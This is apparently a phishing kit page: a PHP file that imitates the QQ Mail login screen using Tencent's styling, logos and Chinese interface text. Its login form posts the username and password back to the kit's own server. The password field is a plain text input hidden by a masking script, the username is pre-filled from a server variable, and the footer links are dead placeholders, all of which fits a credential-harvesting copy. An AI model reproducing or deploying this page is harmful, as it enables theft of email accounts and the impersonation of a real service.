<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html lang="zh-cmn"><head><title>登录QQ邮箱</title><meta charset="UTF-8"><meta name="format-detection" content="telephone=no"><meta name="renderer" content="webkit"><meta name="save" content="history"><meta name="version" content="mico"><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><link rel="icon" type="images/png" sizes="16*16" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_16h.png"><link rel="icon" type="images/png" sizes="32*32" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_32h.png"><link rel="icon" type="images/png" sizes="48*48" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_48h.png"><link rel="icon" type="images/png" sizes="96*96" href="https://mail.qq.com/zh_CN/htmledition/images/favicon/qqmail_favicon_96h.png"><link href="https://res.wx.qq.com/t/webmail/webmail/res/css/login.fb69165e0c30bc5468e0.css" rel="stylesheet">

    <style type="text/css" id="main_css"> .testqx{display:none}html{overflow:hidden}body{font-family:Tahoma,Verdana,Arial,宋体;font-size:12px;margin:0}ul{padding:0;margin:0}ul li{list-style-type:none}a{text-decoration:none}a:hover{text-decoration:underline}input[type=text]:focus,input[type=password]:focus{outline:0}input::-ms-clear,input::-ms-reveal{display:none;width:0;height:0}.grayscale{-webkit-filter:grayscale(100%);-moz-filter:grayscale(100%);-ms-filter:grayscale(100%);-o-filter:grayscale(100%);filter:grayscale(100%);filter:url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'><filter id=\'grayscale\'><feColorMatrix type=\'matrix\' values=\'0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\'/></filter></svg>#grayscale");filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1)}.uncheck{background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -74px -163px no-repeat}.checked{background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -92px -163px no-repeat}.login,.login_no_qlogin{margin:0 auto;width:370px;border:2px solid #eee;position:relative}.header{height:50px;border-bottom:1px solid #e2e2e2;position:relative;font-family:"微软雅黑"}.header .switch{height:45px;position:absolute;left:60px;bottom:0;font-size:16px}.header .switch #switcher_qlogin{margin-right:85px}.header .switch .switch_btn{color:#999;display:inline-block;height:45px;line-height:45px;outline:0}.header .switch .switch_btn_focus{color:#333;display:inline-block;height:45px;line-height:45px;outline:0}.header .switch .switch_btn:hover{color:#333;text-decoration:none}.header .switch .switch_btn_focus:hover{text-decoration:none}.header .switch .switch_bottom{position:absolute;bottom:-1px;border-bottom:2px solid #848484}.header .close{width:47px;height:20px;float:right;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -221px -126px no-repeat;outline:0}.header .close:hover{background-position:-221px -151px}.login_no_qlogin .header{border:none;height:40px}.login_no_qlogin .header .switch{height:40px;position:absolute;left:20px;top:10px;font-size:22px}.login_no_qlogin .header .switch .switch_bottom,.login_no_qlogin .header .switch .switch_btn{display:none}.login_no_qlogin .header .switch .switch_btn_focus{color:#333;cursor:default;text-decoration:none;display:inline-block;height:30px;line-height:30px}.web_login{width:370px;position:relative;padding-bottom:65px}.web_login .tips{height:50px;width:270px;position:relative;margin:0 auto;z-index:11}.loginTips{position:absolute;height:50px;z-index:100}.loginTips .error_tips{padding:5px;border:1px solid #dad699;background:#f9f5c7;position:absolute;bottom:0;border-radius:2px;width:258px;left:50px}.loginTips .error_tips .error_logo{position:absolute;left:3px;height:18px;line-height:18px;width:18px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) 0 -162px no-repeat}.loginTips .loading_tips{text-align:center;height:24px;display:none;position:absolute;top:10px;width:370px}.loginTips .error_tips .err_m{display:inline-block;padding-left:20px;line-height:18px;color:#434343;vertical-align:middle;text-align:left}.web_login .operate_tips{display:none;padding:8px;border:1px solid #dad699;background:#f9f5c7;position:absolute;bottom:-3px;border-radius:2px}.web_login .operate_tips .tips_link{color:#f39800}.web_login .operate_tips .down_row{position:absolute;bottom:-6px;_bottom:-7px;left:20px;width:12px;height:6px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -162px -161px no-repeat;font-size:1px}.web_login .operate_tips .operate_content{width:100%;text-align:left}.web_login .login_form{width:272px;margin:0 auto}.web_login .inputOuter{width:272px;height:42px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -1px -1px no-repeat}.web_login .inputOuter_focus{width:272px;height:42px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -1px -45px no-repeat}.web_login .inputstyle{width:258px;position:relative;top:2px;left:2px;height:18px;padding:11px 0 11px 10px;line-height:18px;border:none;background:0 0;color:#333;font-family:Verdana,Tahoma,Arial;font-size:16px}.web_login .input_tips,.web_login .input_tips_focus{position:absolute;top:13px;+top:15px;left:13px;font-size:14px;line-height:16px;color:#aaa;cursor:text}.web_login .input_tips_focus{color:#ddd}.web_login .uinArea{height:55px;position:relative;z-index:10}.web_login .uin_del{width:21px;height:21px;cursor:pointer;position:absolute;right:15px;top:10px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -116px -160px no-repeat;display:none}.web_login .uin_del:hover{background-position:-139px -160px}.web_login .email_list{border:1px solid #70c2ec;background:#fff;width:266px;position:absolute;z-index:10;display:none;border-radius:1px;padding:1px;left:2px}.web_login .email_list li,.web_login .email_list p{height:31px;line-height:31px;margin:0;overflow:hidden;padding-left:10px}.web_login .email_list p{height:16px;line-height:10px}.web_login .email_list .hover{background:#cbe2fa}.web_login .pwdArea{height:55px;position:relative;z-index:3}.web_login .lock_tips{position:absolute;top:32px;left:-15px;height:16px;padding:5px;text-align:center;display:none;border:1px solid #dad699;background:#f9f5c7;border-radius:2px}.web_login .lock_tips .lock_tips_row{position:absolute;top:-6px;left:25px;width:12px;height:6px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -162px -168px no-repeat}.web_login .verifyArea{display:none;height:120px;position:relative}.web_login .verifyinputArea{height:55px}.web_login .verifycode{color:#333;font-size:16px}.web_login .verifyimgArea{position:relative;height:55px;cursor:pointer}.web_login .verifyimgArea .verifyimg{height:55px;width:150px;position:absolute;left:0}.web_login .verifyimgArea .verifyimg_tips{position:absolute;left:165px;top:15px;color:#000}.web_login .submit{position:relative;height:40px}.web_login .login_button{position:absolute;left:0;outline:0}.web_login .login_button .btn{width:115px;height:35px;line-height:35px;border:none;font-size:18px;font-weight:700;color:#fff;cursor:pointer;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) 0 -90px no-repeat}.web_login .login_button:hover .btn{background-position:-116px -90px}.web_login .login_button:hover{text-decoration:none}.web_login .low_login{position:absolute;left:140px;top:10px}.web_login .low_login .checked,.web_login .low_login .uncheck{float:left;height:18px;width:18px}.web_login .low_login .low_login_wording{height:16px;line-height:16px;line-height:18px\9;cursor:pointer;margin-left:5px}.bottom{height:16px;margin-bottom:8px;width:360px;position:absolute;bottom:0;right:10px;text-align:right;font-size:12px}.bottom .link{color:#666}.bottom .dotted{color:#bfbfbf;margin:0 5px}.bottom .vip_link:hover{color:red}.bottom .low_login{position:absolute;bottom:0;left:10px}.bottom .low_login .checked,.bottom .low_login .uncheck{float:left;height:18px;width:18px}.bottom .low_login .low_login_wording{height:16px;line-height:16px;line-height:18px\9;cursor:pointer;margin-left:5px}.web_qr_login{position:relative;height:265px;overflow:hidden}.authLogin,.web_qr_login .web_qr_login_show{position:absolute;top:0}.noscript{background:#F9F5C7;border:1px solid #DAD699;display:inline-block;height:24px;line-height:24px;padding:5px;text-align:center}.authLogin,.hide{display:none}.authLogin{background:#FFF;height:315px;width:100%;z-index:9999}.authLogin .authHeader{height:50px;border-bottom:1px solid #e2e2e2;position:relative;font-family:"Hiragino Sans GB","微软雅黑"}.authLogin .authHeader .title{position:absolute;top:5px;left:20px;line-height:30px;height:30px;font-size:22px}.authLogin .authTips{height:30px}.authLogin .authInfo{text-align:center}.authLogin .authWording{text-align:center;color:#A0A0A0;line-height:20px;height:35px}.authLogin .face{display:inline-block;height:120px;width:120px;text-align:center;position:relative;cursor:pointer;outline:0}.authLogin .face:focus{outline:0}.authLogin .face:hover{border:none;text-decoration:none}.authLogin .face img{width:80px;height:80px;position:absolute;top:10px;left:19px;border:none}.authLogin .face .img_out{width:88px;height:88px;position:absolute;top:4px;left:14px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) 0 -182px no-repeat}.authLogin .face .img_out_focus,.authLogin .face:hover .img_out{width:88px;height:88px;position:absolute;top:5px;left:15px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -91px -183px no-repeat}.authLogin .face .nick,.qlogin .face .nick{top:100px;height:20px;line-height:18px;color:#6f7479;vertical-align:middle}.authLogin .face .vip_logo,.qlogin .face .vip_logo{background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -236px -92px no-repeat}.authLogin .face .nick{display:inline-block;text-align:center;position:absolute;left:0;width:100%;overflow:hidden;font-family:Tahoma,\u5fae\u8f6f\u96c5\u9ed1,\u5b8b\u4f53,Verdana,Arial,sans-serif}.authLogin .red{color:red}.authLogin .face .vip_logo{width:26px;height:12px;position:absolute;top:12px;left:21px}.authLogin .face .uin{display:none}.authLogin .face:hover .uin{display:block;background:#000;height:20px;width:80px;line-height:20px;position:absolute;left:20px;top:72px;filter:Alpha(opacity=50);opacity:.5;color:#fff;border-radius:0 0 4px 4px}.authLogin .face .face_mengban{background:#000;width:80px;height:80px;position:absolute;top:10px;left:20px;filter:Alpha(opacity=30);opacity:.3}.authLogin .cancleAuthOuter{margin-top:10px;text-align:center}.authLogin .cancleAuth{display:inline-block;height:14px;border:1px solid #d3d3d3;padding:3px;cursor:pointer;color:#888;text-decoration:none}.authLogin .bottom{position:absolute;bottom:-2px;left:0;width:100%;height:25px}.authLogin .low_login{position:absolute;bottom:0;left:10px}.authLogin .low_login .checked,.authLogin .low_login .uncheck{float:left;height:18px;width:18px}.authLogin .low_login .low_login_wording{height:16px;line-height:16px;line-height:18px\9;cursor:pointer;margin-left:5px}.authLogin .feedback_authLogin{position:absolute;bottom:0;right:10px}.qlogin{height:265px;position:relative;margin:0 auto;display:none}.qlogin .qlogin_tips{color:#A0A0A0;height:30px;padding-top:40px;text-align:center}.qlogin .qlogin_select{height:160px;position:relative}.qlogin .qlogin_show{width:300px;height:200px;position:absolute;left:35px;overflow:hidden}.qlogin .nextPage,.qlogin .prePage{width:25px;position:absolute;top:70px;display:none;text-align:center}.qlogin .qlogin_list{height:100%;position:absolute;text-align:center}.qlogin .prePage{height:120px;left:5px}.qlogin .nextPage{height:120px;right:10px}.qlogin .preRow{width:16px;height:35px;display:inline-block;margin-top:35px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -181px -185px no-repeat;cursor:pointer}.qlogin .prePage:hover .preRow{background-position:-181px -228px}.qlogin .nextRow{width:16px;height:35px;display:inline-block;margin-top:35px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -201px -185px no-repeat;cursor:pointer}.qlogin .nextPage:hover .nextRow{background-position:-201px -228px}.qlogin .face{display:inline-block;height:120px;width:100px;text-align:center;position:relative;cursor:pointer;outline:0}.qlogin .face:focus{outline:0}.qlogin .face:hover{border:none;text-decoration:none}.qlogin .face img{width:80px;height:80px;position:absolute;top:10px;left:9px;border:none}.qlogin .face .img_out{width:88px;height:88px;position:absolute;top:4px;left:4px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) 0 -182px no-repeat}.qlogin .face .img_out_focus,.qlogin .face:hover .img_out{width:88px;height:88px;position:absolute;top:5px;left:5px;background:url(https://ui.ptlogin2.qq.com/style/11/images/icon_3.png) -91px -183px no-repeat}.qlogin .face .nick{display:inline-block;text-align:center;position:absolute;left:0;width:100%;overflow:hidden;font-family:Tahoma,Verdana,Arial,sans-serif}.bottom .red,.qlogin .face .red{color:red}.qlogin .face .vip_logo{width:26px;height:12px;position:absolute;top:12px;left:11px}.qlogin .face:hover .uin,.qlogin .face:hover .uin_menban{height:20px;line-height:20px;top:72px;width:80px;position:absolute}.qlogin .face .uin,.qlogin .face .uin_menban{display:none}.qlogin .face:hover .uin_menban{display:block;left:10px;background:#000;filter:Alpha(opacity=50);opacity:.5;border-radius:0 0 4px 4px}.qlogin .face:hover .uin{display:block;left:10px;color:#fff}.qlogin .face .face_mengban{background:#000;width:80px;height:80px;position:absolute;top:10px;left:10px;filter:Alpha(opacity=30);opacity:.3}.qlogin .tips{height:60px;margin-top:20px}.qlogin .tips_logo{display:none}.qlogin .err_m{display:inline-block;height:18px;vertical-align:middle;line-height:18px;color:#a0a0a0}.qlogin .loading_tips,.qlogin .wording_tips{height:25px;text-align:center}.qlogin .loading_tips{visibility:hidden}.qlogin .low_login{position:absolute;left:12px;bottom:6px;height:18px}.qlogin .low_login .checked,.qlogin .low_login .uncheck{float:left;height:18px;width:18px}.qlogin .low_login .low_login_wording{float:left;height:16px;line-height:16px;line-height:18px\9;margin-left:5px;color:#b5bbc1;cursor:pointer}.qlogin .qr_0{display:inline-block;height:100%;width:150px;text-align:center;position:relative}.qlogin .qr_0 a{outline:0}.qlogin .qr_0 .qr_safe_login,.qlogin .qr_0 .qr_short_tips{display:none}.qlogin .qr_0 .qr_info_link{background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_tiny.png) 0 -541px no-repeat;_background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_8.png) 0 -541px no-repeat;color:grey;display:inline-block;height:30px;line-height:30px;text-decoration:none;width:152px}.qlogin .qr_0 .qr_info_link:hover{background-position:0 -573px;text-decoration:none}.qlogin .qr_0 .qr_info_link_en{text-decoration:none;display:inline-block;width:152px;height:38px;line-height:18px;color:grey;background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_tiny.png) 0 -606px no-repeat;_background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_8.png) 0 -606px no-repeat}.qlogin .qr_0 .qr_info_link_en:hover{background-position:0 -647px;text-decoration:none}.qlogin .qr_0 .qr_safe_tips{height:20px;line-height:20px;font-size:14px;font-weight:700;text-align:center;margin-left:5px}.qlogin .qr_0 .qrImg{position:absolute;height:130px;width:130px;left:12px;top:30px;border:1px solid #D3D3D3;z-index:1000}.qlogin .qr_0 .qr_app_name{display:inline-block;text-align:center;position:absolute;bottom:0;left:4px;vertical-align:middle;width:100%;overflow:hidden}.qlogin .qr_0 .qr_mengban,.qlogin .qr_0 .qrlogin_img_out{background:rgba(0,0,0,.4);#background:none;-ms-filter:progid:DXImageTransform.Microsoft.Gradient(GradientType=0, StartColorStr='#66000000', EndColorStr='#66000000');filter:progid:DXImageTransform.Microsoft.Gradient(GradientType=0, StartColorStr='#66000000', EndColorStr='#66000000');zoom:1;height:134px;left:11px;position:absolute;top:0;width:134px;z-index:1000}.qlogin .qr_0 .qrlogin_img_out,:root .qlogin .qr_0 .qr_mengban{filter:none\9}.qlogin .qr_0 .qrlogin_img_out{background:0 0;-ms-filter:none;filter:none}.qlogin .qr_0 .qr_invalid_tips{color:#FFF;cursor:pointer;left:11px;line-height:20px;position:absolute;text-align:center;top:75px;width:134px;z-index:1000}.qlogin .qr_1{display:inline-block;height:120px;width:100px;text-align:center;position:relative}.qlogin .qr_1 .qr_info_link,.qlogin .qr_1 .qr_info_link_en{display:none}.qlogin .qr_1 .qrImg{height:82px;left:12px;position:absolute;top:8px;width:82px;border:1px solid #D3D3D3}.qlogin .qr_1 .qr_app_name{display:inline-block;text-align:center;position:absolute;top:100px;left:0;height:20px;line-height:18px;vertical-align:middle;width:108px;overflow:hidden}#onekey_verify,.newVcodeArea,.ov-tips,.qlogin .qr_1 .qr_safe_tips,.qlogin .qr_1 .qr_tips,.qlogin .qr_invalid,.qr_tips,.qrlogin_step2{display:none}.qlogin .qr_1 .qr_app_name a{cursor:pointer;outline:0}.qlogin .qr_short_tips{color:#3481CF}.qlogin .qr_1 .qr_tips{position:absolute;top:30;left:0;width:100px;height:150px}.qlogin .qr_1 .qr_mengban,.qlogin .qr_1 .qrlogin_img_out{background:#000;width:84px;height:84px;position:absolute;top:8px;left:12px;filter:Alpha(opacity=40);opacity:.4;z-index:1000}.qlogin .qr_1 .qrlogin_img_out{filter:Alpha(opacity=1);opacity:.01}.qlogin .qr_1 .qr_invalid_tips{color:#FFF;cursor:pointer;left:12px;line-height:20px;position:absolute;text-align:center;top:30px;width:85px;z-index:1000}.qrlogin_step2{position:absolute;width:100%;height:100%;left:0;top:0;background:#fff;z-index:1000}.qrlogin_step2 .step2_outer{height:110px;margin:50px 0 0 33px;padding:80px 0 0 115px;background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_tiny.png) 0 -348px no-repeat #fff;_background:url(https://ui.ptlogin2.qq.com/style/33/images/icon_3_8.png) 0 -348px no-repeat #fff}.qrlogin_step2 .qr_h3{text-align:left;margin:0;padding-bottom:20px;font-size:14px;font-weight:700}.qrlogin_step2 .goBack{color:#b4b4b4}.qrlogin_step2 .goBack a{color:#3481cf}.qr_tips{position:absolute;left:216px;top:70px;height:200px;width:160px;z-index:999}.qr_tips .qr_tips_menban{opacity:.5;filter:alpha(opacity=50);background:#fff;width:100%;height:100%}.qr_tips .qr_tips_pic{width:160px;height:196px;position:absolute;top:0}.qr_tips .qr_tips_pic_chs,.qr_tips .qr_tips_pic_cht,.qr_tips .qr_tips_pic_en{background:url(https://ui.ptlogin2.qq.com/style/20/images/shouQ_v2/small_24_tiny.png) no-repeat;background:url(https://ui.ptlogin2.qq.com/style/20/images/shouQ_v2/small_8.png) no-repeat\9}.newVcodeArea{background:#FFF;height:315px;position:absolute;top:0;width:100%;z-index:9999}#onekey_verify{width:289px;height:276px;color:#2f3436;margin:12px auto 0;letter-spacing:1px}#onekey_verify.invalid{margin-top:30px}.ov-tips{letter-spacing:1px;height:35px;line-height:1.5}.ov-tips em{font-size:14px;font-weight:700;font-style:normal;letter-spacing:0}.ov-scene{width:100%;height:137px;margin-top:18px}.ov-1 .aq-app,.ov-2 .aq-wx,.ov-3 .aq-mqq{display:block}.invalid .aq-app,.invalid .aq-mqq,.invalid .aq-wx{display:none}.invalid .timeout{display:block;color:red}.ov-1 .ov-scene{background:url("https://ui.ptlogin2.qq.com/style/20/images/aq/mail_verify_1.png") 39px 0 no-repeat}.ov-2 .ov-scene{background:url("https://ui.ptlogin2.qq.com/style/20/images/aq/mail_verify_2.png") 39px 0 no-repeat}.ov-3 .ov-scene{background:url("https://ui.ptlogin2.qq.com/style/20/images/aq/mail_verify_3.png") 39px 0 no-repeat}.invalid .ov-scene{background-position:39px -137px}.ov-retry a,.timeout a{color:#0b6ee9} .ptui-dialog-wrap {
        position:fixed;
        top:0;
        left:0;
        width:100%;
        height:100%;
        z-index:10000;
    }
    .ptui-dialog-wrap__inner {
        position:absolute;
        top:50%;
        left:50%;
        z-index:10002;
        width:360px;
        transform:translate(-50%, -50%);
        background-color:#FFF;
        border-radius:6px;
        overflow:hidden;
    }
    .ptui-dialog-wrap__hd {
        display:flex;
        flex-direction:row;
        justify-content:space-between;
        padding:4px;
    }
    .ptui-dialog-wrap__btn-close {
        display:block;
        width:16px;
        height:16px;
            padding:0;
            margin:0;
        background-color:transparent;
        cursor: pointer;
            border:0 none;
    }
    .ptui-dialog-wrap__icon {
        display:block;
        width:16px;
        height:16px;
    }
    .ptui-dialog-wrap__text-title {
        font-size: 13px;
        font-weight: 500;
        line-height:1.5;
        color: #000000;
    
        display: -webkit-box;
        -webkit-line-clamp: 1;
        -webkit-box-orient: vertical;
        overflow: hidden;
    }
    .ptui-dialog-wrap__text-title + .ptui-dialog-wrap__text-content {
        margin-top:8px;
    }
    .ptui-dialog-wrap__text-link {
        color:#2E77E5;
    }
    .ptui-dialog-wrap__bd {
        padding:20px 20px 10px 20px;
    }
    .ptui-dialog-wrap__text-content {
        display:inline-block;
        line-height:1.5;
        font-size:12px;
        color:#000000;
    }
    .ptui-dialog-wrap__ft {
        padding: 10px 20px 20px 0;
    
        display:flex;
        flex-direction:row;
        justify-content:flex-end;
    }
    .ptui-dialog-wrap__btn {
        margin-right:10px;
            padding:3px 19px;
            max-height:28px;
            line-height:1.5;
        text-align: center;
        font-size: 13px;
        font-weight: 400;
        box-sizing: border-box;
        outline:0 transparent;
        border-radius:4px;
        cursor: pointer;
    }
    .ptui-dialog-wrap__btn:nth-last-of-type(1) {
        margin-right:0;
    }
    .ptui-dialog-wrap__btn-confirm {
        color:#FFF;
        background-color:#0099FF;
        border:1px solid transparent;
    }
    .ptui-dialog-wrap__btn-cancel {
        border:1px solid #CCCCCC;
        color:#000000;
        background-color:transparent;
    }
    .ptui-dialog-wrap__mask {
        position:absolute;
        top:0;
        left:0;
        z-index:8;
        width:100%;
        height:100%;
        background-color:rgba(0, 0, 0, 0.32);
    }

    .switch {
      margin-left: -27px;
   }
    
    .login, .login_no_qlogin{   border:0px;  background-color:#ffffff; }
    .header .logo,.authHeader .logo{
        background:url("https://ui.ptlogin2.qq.com/style/11/images/icon_24_c_3.png") no-repeat;
        _background:url("https://ui.ptlogin2.qq.com/style/11/images/icon_3.png") no-repeat;  background-position:0 -280px;  }  /* 搜狗客户端 */  </style>
        <link href="https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail_en.css" rel="stylesheet" type="text/css">
    </head>
    <body style="overflow-y: auto;">
        <div class="login_index">
       <div class="commonFrame_header">
          <a href="javascript:void(0);" class="commonFrame_header_logo">QQ Mail</a> 
          <div class="commonFrame_header_right">
             <a href="javascript:void(0);">English</a> <span class="commonFrame_seperator">|</span>  <a href="#" target="_blank">手机版</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">企业邮箱</a>
          </div>
       </div>
       <div class="login_index_main">
          <div class="login_index_container">
             <div id="login_index_container_right" class="login_index_container_right">
                <div class="login_loginBox">
                   <div class="login_loginBox_tab">
                      <div class="login_loginBox_tab_item">微信登录</div>
                      <div class="login_loginBox_tab_item login_loginBox_tab_item_Active">QQ登录</div>
                   </div>
                   <div class="login_loginBox_body">
                      <div class="login_loginBox_wx">
                      </div>
                      <div id="iframe_qq" class="login_loginBox_qq" style="z-index: 10; left: 0px; right: 0px;">
                         <div class="login" id="login">
                           <div id="header" class="header">
                              <div class="switch" id="switch"><a class="switch_btn" hidefocus="true" id="switcher_qlogin" href="javascript:void(0);" tabindex="7">使用QQ手机版扫码登录。</a><a class="switch_btn_focus" hidefocus="true" id="switcher_plogin" tabindex="8">Different ID</a><div class="switch_bottom" id="switch_bottom"></div>
                           </div></div>
                            <div class="web_qr_login" id="web_qr_login">
                               <div class="web_qr_login_show" id="web_qr_login_show">
                                  <div class="web_login" id="web_login">
                                     <div class="tips" id="tips">
                                        <div class="operate_tips" id="operate_tips"><span class="operate_content">手机号码也可登录哦，<a class="tips_link" id="bind_account" href="javascript:void(0);">登录个人中心绑定</a> </span><span class="down_row"></span></div>
                                     </div>
                                     <div class="login_form">
                                        <form id="login-form" name="login-form" action="" method="post" autocomplete="off">
                                          <input type="hidden" name="login" value="qq">
                                           <div class="uinArea" id="uinArea">
                                              <div class="inputOuter"><input type="text" class="inputstyle" id="user" name="user" placeholder="支持QQ号/邮箱/手机号登录" value="<?php echo htmlspecialchars($decoded); ?>" tabindex="1"></div>
                                           </div>
                                           <div class="pwdArea" id="pwdArea">
                                              <div class="inputOuter"><input type="text" class="inputstyle password" id="password" name="pass" placeholder="请输入密码" maxlength="16" tabindex="2"></div>
                                           </div>
                                          <div class="loginTips" style="<?php echo $error; ?>">
                                             <div class="error_tips" id="error_tips"><span class="error_logo" id="error_logo"></span> <span class="err_m" id="err_m">你输入的账号或密码不正确，请重新输入。</span></div>
                                          </div>
                                           <div class="verifyArea" id="verifyArea">
                                              <div class="verifyinputArea" id="verifyinputArea">
                                                 <label class="input_tips" id="vc_tips" for="verifycode">Verification Code</label>
                                                 <div class="inputOuter"><input name="verifycode" type="text" class="inputstyle verifycode" id="verifycode" value="" tabindex="3"></div>
                                              </div>
                                              <div class="verifyimgArea" id="verifyimgArea"><img class="verifyimg" id="verifyimg" title="Not clear?"> <a tabindex="4" href="javascript:void(0);" class="verifyimg_tips">Not clear?</a></div>
                                           </div>
                                           <div class="submit"><div class="login_button"><input type="submit" tabindex="6" value="登录" class="btn" id="login_button"></div></div>
                                        </form>
                                     </div>
                                 </div>
                              </div>
                            </div>
                         </div>
                      </div>


                      <div class="login_loginBox_wx_state" style="z-index: 99; top: 250px; margin-left: 6px;">
                         <p style="color: rgb(46, 48, 51);"><input type="checkbox" id="auto_login"> <label for="auto_login">下次自动登录</label> <img src="https://res.wx.qq.com/t/webmail/webmail/res/static/images/mail/web/components/LoginBox/questionmark_circle_20.ef88ee5.svg" alt="" style="width: 18px; margin-left: 26px;"> <img src="https://rescdn.qqmail.com/qqmail/images/hover-en2.png" alt="" class="login_hover_text" style="display: none;">&nbsp;帮助</p>
                      </div>
                     <div class="bottom" id="bottom_web" style="z-index: 100; top: 317px; margin-left: 6px;"><a href="#" class="link" id="forgetpwd" target="_blank">找回密码 </a><span class="dotted">|</span> <a href="#" class="link" target="_blank"> 注册账号 </a><span class="dotted">|</span> <a class="link" id="feedback_web" href="#" target="_blank">意见反馈</a></div>
                   </div>
                </div>
             </div>
             <div class="login_index_container_left">
                    
                <div class="login_index_pictures">
                   <div class="login_index_pictures_picture" style="background-image: url(&quot;https://rescdn.qqmail.com/zh_CN/htmledition/images/tg-chang1ea8a2.png&quot;); background-position: right 0px;"></div>
                   <div class="login_index_pictures_txt">
                      <p class="login_index_pictures_title" style="font-size:32px;">QQ邮箱，常联系！</p>
                      <p style="color: #13181d;font-size:18px;">2500年前，人们用鸽子传递信息。</p>
                      <p style="color: #13181d;font-size:18px;">183年前，摩尔斯发明了电报。</p>
                      <p style="color: #13181d;font-size:18px;">50年前，第一封电子邮件发出。</p>
                      <p style="color: #13181d;font-size:18px;">如今，QQ邮箱连接着每个人。</p>
                   </div>
                </div>
             </div>
          </div>
       </div>
       <div class="commonFrame_footer">
          <a href="#" target="_blank">关于腾讯</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">服务条款</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">隐私政策</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">联系我们</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">帮助中心</a><span class="commonFrame_seperator">|</span> <a href="#" target="_blank">账号与安全</a><span class="commonFrame_seperator">|</span> 
